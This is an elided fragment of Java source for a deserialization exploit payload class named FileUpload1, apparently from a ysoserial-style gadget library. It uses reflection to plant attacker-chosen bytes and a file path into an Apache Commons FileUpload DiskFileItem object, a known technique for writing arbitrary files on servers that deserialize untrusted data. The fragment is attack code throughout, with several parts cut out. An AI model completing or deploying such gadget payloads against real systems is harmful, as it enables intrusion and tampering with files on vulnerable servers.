...
public class FileUpload1 implements ReleaseableObjectPayload<DiskFileItem> {
    ...
    public void release ( DiskFileItem obj ) throws Exception {
        ...
        dogeser.payloads.util.Reflections.setFieldValue(obj, "dfos", dfos);
    }
    ...
    private static DiskFileItem makePayload ( int thresh, String repoPath, String filePath, byte[] data ) throws IOException, Exception {
        ...
        OutputStream os = (OutputStream) dogeser.payloads.util.Reflections.getFieldValue(dfos, "memoryOutputStream");
        os.write(data);
        dogeser.payloads.util.Reflections.getField(ThresholdingOutputStream.class, "written").set(dfos, data.length);
        dogeser.payloads.util.Reflections.setFieldValue(diskFileItem, "dfos", dfos);
